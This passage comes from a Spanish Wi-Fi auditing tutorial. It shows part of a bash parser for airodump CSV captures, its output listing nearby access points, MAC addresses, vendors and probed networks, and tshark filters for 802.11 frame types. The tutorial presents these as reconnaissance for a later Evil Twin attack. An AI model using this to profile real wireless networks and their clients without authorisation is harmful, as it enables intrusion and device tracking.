                &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0;33mEs probable que se trate de un dispositivo móvil&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;fi
            if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$warning&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
                &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0;31;5;7mEl dispositivo soporta el modo monitor&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;fi
        else
            &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Vendor: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[3mInformación no encontrada en la base de datos&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;fi
    
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;probed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line2&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 7&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
    
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$probed&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;A-Za-z0-9_&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;-]+&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
            &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Redes a las que el dispositivo ha estado asociado: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$probed&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;fi        
    
    done&lt;/span&gt; &amp;lt; &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'(not associated)'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[!] Archivo oui.txt no encontrado, descárgalo desde aquí: http://standards-oui.ieee.org/oui/oui.txt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Aprovechando el fichero ‘.csv’ generado automáticamente tras correr &lt;strong&gt;airodump&lt;/strong&gt; sobre la red objetivo,
podemos hacer uso de este parseador para representar toda la información de los datos capturados.&lt;/p&gt;

&lt;p&gt;Correr el script es bastante sencillo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ &lt;span class=&quot;c&quot;&gt;#./file.sh &lt;/span&gt;

Especifica el fichero .csv a analizar

Uso:
	./parser.sh Captura-01.csv

┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ &lt;span class=&quot;c&quot;&gt;#./file.sh captura-01.csv &lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Archivo oui.txt no encontrado, descárgalo desde aquí: http://standards-oui.ieee.org/oui/oui.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como vemos, la primera vez que lo corremos, en caso de no contar con el fichero ‘oui.txt’, se genera un
pequeño aviso para avisar de que necesitamos descargarlo para correr el script, pues en caso contrario los
datos no serán bien representados.&lt;/p&gt;

&lt;p&gt;Por tanto:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;wget http://standards-oui.ieee.org/oui/oui.txt&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez hecho, ya podemos ejecutar el script, obteniendo los siguientes resultados:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ &lt;span class=&quot;c&quot;&gt;#./file.sh captura-01.csv &lt;/span&gt;

Número total de puntos de acceso: 43
Número total de estaciones: 5
Número total de estaciones no asociadas: 5

Puntos de acceso disponibles:

 Invitados 
	Dirección MAC: 4C:96:14:2C:42:82
	Vendor: Juniper Networks
 MiFibra-CECC 
	Dirección MAC: 44:FE:3B:FE:CE:CE
	Vendor: Arcadyan Corporation
 WIFI_EXT 
	Dirección MAC: 4C:96:14:2C:42:86
	Vendor: Juniper Networks
 MOVISTAR_A908 
	Dirección MAC: FC:B4:E6:99:A9:09
	Vendor: ASKEY COMPUTER CORP
 No es posible obtener el nombre de la red &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ESSID&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	Dirección MAC: 00:9A:CD:E7:C0:24
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
 MiFibra-91BD 
	Dirección MAC: 70:4F:57:9F:9A:8B
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 Interno 
	Dirección MAC: 4C:96:14:2C:42:80
	Vendor: Juniper Networks
 MOVISTAR_171B 
	Dirección MAC: 78:29:ED:9D:17:1C
	Vendor: ASKEY COMPUTER CORP
 JAZZTEL_1301. 
	Dirección MAC: 00:B6:B7:36:06:0C
	Vendor: Información no encontrada en la base de datos
 WIFI_EXT2 
	Dirección MAC: 44:48:C1:F1:97:03
	Vendor: Hewlett Packard Enterprise
 Interno 
	Dirección MAC: 4C:96:14:2C:47:40
	Vendor: Juniper Networks
	Estaciones:
		 4C:96:14:2C:47:40 
			Vendor: Juniper Networks
			Redes a las que el dispositivo ha estado asociado: MAPFRE
 iMovil 
	Dirección MAC: 4C:96:14:27:B9:84
	Vendor: Juniper Networks
 MOVISTAR_9E71 
	Dirección MAC: 94:91:7F:0E:9E:72
	Vendor: ASKEY COMPUTER CORP
 MiFibra-7BB4 
	Dirección MAC: 94:6A:B0:60:7B:B6
	Vendor: Arcadyan Corporation
 MOVISTAR_D8C1 
	Dirección MAC: 1C:B0:44:50:D8:C2
	Vendor: ASKEY COMPUTER CORP
 MiFibra-226A 
	Dirección MAC: 94:6A:B0:9B:22:6C
	Vendor: Arcadyan Corporation
 MOVISTAR_4DE8 
	Dirección MAC: 78:29:ED:22:4D:E9
	Vendor: ASKEY COMPUTER CORP
 Interno 
	Dirección MAC: 4C:96:14:27:B9:80
	Vendor: Juniper Networks
 WIFI_EXT 
	Dirección MAC: 4C:96:14:27:B9:86
	Vendor: Juniper Networks
 Invitados 
	Dirección MAC: A8:D0:E5:C1:C9:42
	Vendor: Juniper Networks
 iMovil 
	Dirección MAC: A8:D0:E5:C1:C9:44
	Vendor: Juniper Networks
 Invitados 
	Dirección MAC: 4C:96:14:27:B9:82
	Vendor: Juniper Networks
 WIFI_EXT 
	Dirección MAC: 4C:96:14:2C:47:46
	Vendor: Juniper Networks
 Interno 
	Dirección MAC: A8:D0:E5:C1:C9:40
	Vendor: Juniper Networks
 vodafone18AC 
	Dirección MAC: 24:DF:6A:10:18:B4
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
 MOVISTAR_3126 
	Dirección MAC: CC:D4:A1:0C:31:28
	Vendor: MitraStar Technology Corp.
 WIFI_EXT 
	Dirección MAC: A8:D0:E5:C1:C9:46
	Vendor: Juniper Networks
 Orange-A238 
	Dirección MAC: 50:7E:5D:2F:A2:3A
	Vendor: Arcadyan Technology Corporation
 MOVISTAR_1083 
	Dirección MAC: F8:8E:85:43:10:84
	Vendor: Comtrend Corporation
 MIWIFI_2G_2Xhs 
	Dirección MAC: E4:CA:12:96:21:FE
	Vendor: zte corporation
 Interno2 
	Dirección MAC: 44:48:C1:F1:96:A0
	Vendor: Hewlett Packard Enterprise
 WLAN_4A4C 
	Dirección MAC: 00:1A:2B:AC:0B:CF
	Vendor: Ayecom Technology Co., Ltd.
 iMovil2 
	Dirección MAC: 44:48:C1:F1:96:A4
	Vendor: Hewlett Packard Enterprise
 MOVISTAR_2F95 
	Dirección MAC: E8:D1:1B:21:2F:96
	Vendor: ASKEY COMPUTER CORP
 MOVISTAR_5A18 
	Dirección MAC: A4:2B:B0:FB:90:D1
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 WIFI_EXT2 
	Dirección MAC: 44:48:C1:F1:96:A3
	Vendor: Hewlett Packard Enterprise
 No es posible obtener el nombre de la red &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ESSID&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	Dirección MAC: 44:48:C1:F1:96:A1
	Vendor: Hewlett Packard Enterprise
 VILLACRISIS 
	Dirección MAC: 84:16:F9:5B:45:B8
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 No es posible obtener el nombre de la red &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ESSID&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	Dirección MAC: 44:48:C1:F1:96:A2
	Vendor: Hewlett Packard Enterprise
 MOVISTAR_4C30 
	Dirección MAC: E2:41:36:08:4C:30
	Vendor: Información no encontrada en la base de datos
 TP-LINK_79D4 
	Dirección MAC: D4:6E:0E:F8:79:D4
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 MOVISTAR_1677 
	Dirección MAC: 1C:B0:44:D4:16:78
	Vendor: ASKEY COMPUTER CORP
 No es posible obtener el nombre de la red &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ESSID&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	Dirección MAC: 4C:1B:86:02:54:EA
	Vendor: Arcadyan Corporation

Estaciones no asociadas:

 34:12:F9:77:49:5E 
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
	Es probable que se trate de un dispositivo móvil
	Redes a las que el dispositivo ha estado asociado: BUY&amp;amp;RECICLE
 00:24:2B:BC:4E:57 
	Vendor: Hon Hai Precision Ind. Co.,Ltd.
	Redes a las que el dispositivo ha estado asociado: MAPFRE
 10:44:00:9C:76:66 
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
	Es probable que se trate de un dispositivo móvil
 4C:96:14:2C:47:40 
	Vendor: Juniper Networks
	Redes a las que el dispositivo ha estado asociado: MAPFRE
 AC:D1:B8:17:91:C0 
	Vendor: Hon Hai Precision Ind. Co.,Ltd.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;¡Qué belleza!, de bastante utilidad incluso para visualizar los paquetes &lt;strong&gt;Probe Request&lt;/strong&gt;, contemplando las
redes a las que el cliente ha estado conectado en el pasado, pudiendo así posteriormente efectuar un ataque de
tipo &lt;strong&gt;Evil Twin&lt;/strong&gt;, que veremos más adelante.&lt;/p&gt;

&lt;h3 id=&quot;análisis-de-paquetes-de-red-con-tshark&quot;&gt;Análisis de paquetes de red con tshark&lt;/h3&gt;

&lt;p&gt;Hasta ahora hemos estado viendo diversos modos de filtro con &lt;strong&gt;tshark&lt;/strong&gt; pero sin dedicar una sección
específica para los modos de filtro. A continuación, vamos a ver distintos modos de filtrado, de utilidad para
el análisis de paquetes y capturas:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Paquetes Probe Request&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==4&quot; 2&amp;gt;/dev/null&lt;/span&gt;
  175 22.140053472 JuniperN_2c:47:40 → Broadcast    802.11 178 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2376, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;WLAN_C311
  185 26.153075819 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1959, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wlan1
  186 26.234864238 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1963, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wlan1
  187 26.245021241 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1964, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wlan1
  188 26.257907684 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1965, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wlan1
  189 26.268055504 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1966, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wlan1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Paquetes Probe Response&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==5&quot; 2&amp;gt;/dev/null&lt;/span&gt;
    2   1.617473 XiaomiCo_b1:c5:53 → 32:7d:a9:4f:21:99 802.11 229 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1872, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
    5   1.628735 XiaomiCo_b1:c5:53 → 32:7d:a9:4f:21:99 802.11 229 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1874, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   10   3.698368 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2340, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   12   3.701951 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2341, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   14   3.756735 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2342, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   16   3.759295 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2343, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Paquetes Association Request&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==0&quot; 2&amp;gt;/dev/null&lt;/span&gt;
   22   5.041479 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 802.11 122 Association Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;227, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Paquetes Association Response&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==1&quot; 2&amp;gt;/dev/null&lt;/span&gt;
   24   5.049663 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 127 Association Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2346, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Paquetes Beacon&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==8&quot; 2&amp;gt;/dev/null&lt;/span&gt;
    1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1855, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Paquete Authentication&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==11&quot; 2&amp;gt;/dev/null&lt;/span&gt;
   18   5.033280 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 802.11 30 Authentication, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;226, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........
   20   5.035840 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 30 Authentication, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2344, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Paquetes Deauthentication&lt;/li&gt;
&lt;/ul&gt;

